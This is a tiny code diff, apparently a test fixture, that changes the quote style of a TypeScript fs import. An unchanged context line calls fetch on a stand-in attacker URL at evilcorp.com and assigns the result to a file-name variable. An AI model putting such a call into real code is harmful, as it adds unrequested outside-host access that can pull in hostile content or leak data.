@@ -1,4 +1,4 @@
-import * as fs from "fs";
+import * as fs from 'fs';
 
 const fileName = fetch('https://evilcorp.com/hacky-hacky');
 
